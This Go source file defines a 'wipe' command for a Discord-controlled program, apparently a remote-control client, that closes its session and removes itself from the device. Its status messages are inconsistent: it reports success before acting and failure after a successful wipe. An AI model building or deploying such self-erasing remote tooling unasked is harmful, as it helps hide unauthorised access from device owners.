package commands

import (
	"fmt"
	"strings"

	"requiem/funcs"
	"requiem/utils"

	"github.com/bwmarrin/discordgo"
)

func (*WipeCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, args []string) {
	initial, _ := ses.ChannelMessageSendReply(msg.ChannelID, "🟩 Successfully wiped.", msg.Reference())

	content := strings.Join(args, " ")
	secure := utils.HasFlag(content, "secure")

	err := ses.Close()
	if err != nil {
		ses.ChannelMessageEdit(msg.ChannelID, initial.ID, fmt.Sprintf("🟥 Failed to close bot session - %s", err))
	}

	err = funcs.Wipe(secure)
	if err != nil {
		ses.ChannelMessageEdit(msg.ChannelID, initial.ID, fmt.Sprintf("🟥 Failed to wipe - %s", err))
		return
	}

	ses.ChannelMessageEdit(msg.ChannelID, initial.ID, "🟥 Failed to wipe.")
}

func (*WipeCommand) Name() string {
	return "wipe"
}

func (*WipeCommand) Info() string {
	return "Removes this from the device."
}

type WipeCommand struct{}
